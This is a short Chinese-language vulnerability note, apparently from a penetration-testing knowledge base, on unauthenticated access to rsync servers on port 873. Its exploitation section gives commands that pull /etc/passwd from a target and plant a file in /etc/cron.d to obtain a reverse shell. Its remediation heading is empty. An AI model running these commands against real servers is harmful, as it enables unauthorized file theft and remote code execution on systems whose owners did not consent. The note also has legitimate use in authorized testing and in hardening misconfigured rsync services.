# Rsync
## Rsync 未授权访问漏洞
### 漏洞说明
rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。

### 影响范围
/

### 验证方法
**手动验证**: `rsync rsync://your-ip:873/`
**pocsuite**:`poc_rsync_weakpass.py`

### 利用方法
```bash
# 下载任意文件
rsync -av rsync://your-ip:873/src/etc/passwd ./
# 通过crontab反弹shell
rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
```

### 修复方法